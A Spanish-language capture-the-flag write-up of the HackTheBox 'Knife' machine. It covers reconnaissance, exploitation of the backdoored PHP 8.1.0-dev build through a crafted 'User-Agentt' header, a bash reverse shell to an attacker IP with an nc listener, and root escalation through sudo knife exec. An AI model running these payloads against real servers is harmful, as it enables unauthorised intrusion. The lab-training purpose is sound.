---
title: 'Knife'
description: 'Write-Up de la máquina Knife de HackTheBox'
pubDate: 'Jul 03 2025'
image: '/htb/knife/placeholder.png'
heroImage: '/htb/knife/placeholder.png'
private: false
category: 'writeups'
tags: ['htb', 'web', 'linux', 'old version vulnerability', 'php', 'backdoor', 'privilege escalation', 'gtfobins']
---

## Fase de reconocimiento
### Puertos y servicios
Comenzamos con un escaneo con `nmap` para identificar los servicios, con la flag `-sV` para detectar versiones y `-sC` para ejecutar los scripts por defecto.

```bash
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 be:54:9c:a3:67:c3:15:c3:64:71:7f:6a:53:4a:4c:21 (RSA)
|   256 bf:8a:3f:d4:06:e9:2e:87:4e:c9:7e:ab:22:0e:c0:ee (ECDSA)
|_  256 1a:de:a1:cc:37:ce:53:bb:1b:fb:2b:0b:ad:b3:f6:84 (ED25519)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title:  Emergent Medical Idea
|_http-server-header: Apache/2.4.41 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```
Vemos que el servicio http está ejecutando Apache httpd 2.4.41, que es una versión relativamente antigua y podría tener vulnerabilidades conocidas. También vemos que el servicio SSH está disponible.

Antes de acceder al servicio web, podemos usar `whatweb` para identificar las tecnologías utilizadas en la web:

```bash
whatweb http://10.129.209.13/

http://10.129.209.13 [200 OK] Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.209.13], PHP[8.1.0-dev], Script, Title[Emergent Medical Idea], X-Powered-By[PHP/8.1.0-dev]
```

Vemos en los encabezados que la versión que se está ejecutando de PHP es una versión de desarrollo, `8.1.0-dev`, lo cual es inusual y podría ser una pista de que el sitio es vulnerable a alguna explotación.

Luego de buscar en google por esta versión, podemos ver que tiene un backdoor, el cual tras enviar un header específico, nos permite ejecutar código PHP remotamente.

## Fase de explotación
### Explotando el backdoor
Para explotar el backdoor, podemos usar `curl` para enviar una petición HTTP con el header específico. El header que debemos enviar es `User-Agentt` con el siguiente valor `zerodiumsystem()`, por lo cual podemos usar el siguiente comando para verificar:

```bash
curl -s -H "User-Agentt: zerodiumsystem('whoami');" http://10.129.209.13 | head -n 1
```

Vemos que la respuesta es `james`, un usuario del sistema.

### Accediendo al servidor
Para acceder al servidor, podemos hacer uso de una reverse shell, por cual ejecutamos los siguientes comandos:
```bash
# Máquina atacante
nc -lvnp 443

# Curl al backdoor
curl -s -H "User-Agentt: zerodiumsystem(\"bash -c 'bash -i >& /dev/tcp/10.10.14.230/443 0>&1'\");" http://10.129.209.13
```
Y vemos que tenemos acceso, por lo cual procedemos a realizar nuestro tratamiento de la tty para navegar con mayor facilidad:

```shell
export TERM=xterm; export SHELL=bash; alias ll="ls -lha";
```

y con esto ya podemos ver la flag del usuario en su directorio `home`,


## Fase de escalada de privilegios
### Buscando escalado
A pesar de no tener la constraseña del usuario, podemos probar usar el comando `sudo -l` para verificar a que binarios tiene acceso como root

```bash
james@knife:/$ sudo -l

Matching Defaults entries for james on knife:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
User james may run the following commands on knife:
    (root) NOPASSWD: /usr/bin/knife
```

Vemos un binario llamado knife, como el nombre de la máquina, y que puede ejecutarse como root sin necesidad de contraseña

### Obteniendo root
Como sabemos que podemos ejecutar este binario con sudo, podemos buscar en [GTFOBins](https://gtfobins.github.io/gtfobins/knife/#sudo) si hay alguna forma de obtener root y sí, con el siguiente comando:
```bash
sudo knife exec -E 'exec "/bin/sh"'
```
Y con esto ya tenemos acceso al usuario root y por consecuente a su flag 

## Notas finales
### Versión vulnerable de PHP
Siempre es recomendable revisar los headers de los sitios webs y tambien desde consola, ya que nos mostrará un poco más de información que solo verlos con extensiones como "wappalizer", la cual nos indica la versión de php, pero no el "dev" que ya nos da una pista de que puede ser vulnerable.

## Conclusión
A pesar de que es una máquina fácil, el no ver el header de la versión de PHP nos puede hacer dar vueltas por un largo tiempo, por lo cual siempre es recomendable seguir una estructura e ir revisando paso a paso cada información.